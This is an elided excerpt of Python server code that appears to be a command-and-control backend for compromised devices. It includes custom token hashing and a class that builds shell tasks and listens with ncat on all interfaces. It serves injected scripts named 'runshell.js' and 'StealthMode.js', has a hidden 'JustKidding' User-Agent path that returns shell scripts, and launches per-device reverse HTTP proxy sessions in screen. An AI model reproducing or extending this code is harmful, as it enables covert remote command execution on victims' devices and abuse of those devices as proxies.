...
def customHash(passwd):
	return hashlib.sha1(("JYF&6rfvJY^R&D^P+';5r*"+passwd+"JYF&6rfvJY^R&D^P+;5r*").encode()).hexdigest()[20:]
...
def customBase64(encodedTxt, decode=1):
	...
	if decode == -1:
		...
		return encodedTxt
	if isinstance(encodedTxt, bytes):
		encodedTxt = encodedTxt.decode('ascii')
	for i in replacements_:
...
class genShell:
	...
	def runCMD(self, shellcmd, shellcmd_index, assetName):
		...
		with open(os.path.join(BASE_DIR, "assets", "runsh_{}.sh".format(assetName)), "w") as f:
			f.write(runcmd_)
		thread_filename = os.path.join(BASE_DIR, "threads", "%dx%d"%(self.threaduid, self.tasks[shellcmd_index][2]))
		bind_fd = "exec $(%s/misc/ncatBSD -l 0.0.0.0 -p %d -dN > %s && cp %s %s_ready)"%(BASE_DIR, self.lport, thread_filename, thread_filename, thread_filename)
...
def initproc():
	...
	if hashed_key_ in devices_map.keys() and len(isinit)>1 and timeoutController(devices_map[hashed_key_]):
		...
		if len(exec_cmd_):
			...
			exec_cmd_ = exec_cmd_[0]
			with open(os.path.join(BASE_DIR, "JS_scripts", "runshell.js"), "r") as f:
				js_resp = f.read()
		...
		with open(os.path.join(BASE_DIR, "JS_scripts", "init.js"), "r") as f:
			js_resp = f.read()
		with open(os.path.join(BASE_DIR, "JS_scripts", "StealthMode.js"), "r") as f:
			js_resp += f.read()
	...
	holding_line = [x for x in holding_line if x != deviceuuid]
	...
	if request.headers.get('User-Agent') == "JustKidding":
		try:
			with open(os.path.join(BASE_DIR, "assets", "runsh_{}.sh".format(assetName)), "r") as f:
				js_resp = f.read()
...
def pingtask():
	...
	if apitoken == customHash(deviceuuid) or decode_jw_token(apitoken):
		filePath = os.path.join(BASE_DIR, "threads", "{}_ready".format(taskid))
	...
	if apitoken == customHash(deviceuuid) or decode_jw_token(apitoken):
		try:
			...
			if deviceuuid in active_Networks.keys() and not newProxyForced:
				...
				cmd_exec = "screen -S {} -d -m bash -c \"python reverse_http.py {} {}\"\n".format(hashlib.md5(deviceuuid.encode()).hexdigest()[:8], deviceuuid, threadid)
				serial_numb = '0000'
				if newProxyForced == '1':
					...
					try:
						...
						pass
				with open(os.path.join(BASE_DIR, "misc", "initproxy.lst"), 'a') as f:
...
def killProxy():
	...
	if apitoken == customHash(deviceuuid) or decode_jw_token(apitoken):
		try:
			devices_map[hashKey_(deviceuuid, remoteaddr_map[deviceuuid])]
			if deviceuuid in active_Networks.keys():
				cmd_exec = "screen -ls %s | grep -E '\s+[0-9]+\.' | awk -F ' ' '{print $1}' | while read s; do screen -XS $s quit; done"%(hashlib.md5(deviceuuid.encode()).hexdigest()[:8])
				del active_Networks[deviceuuid]
...
def serve_static(filename):
	root_dir = os.path.join(BASE_DIR, "assets")
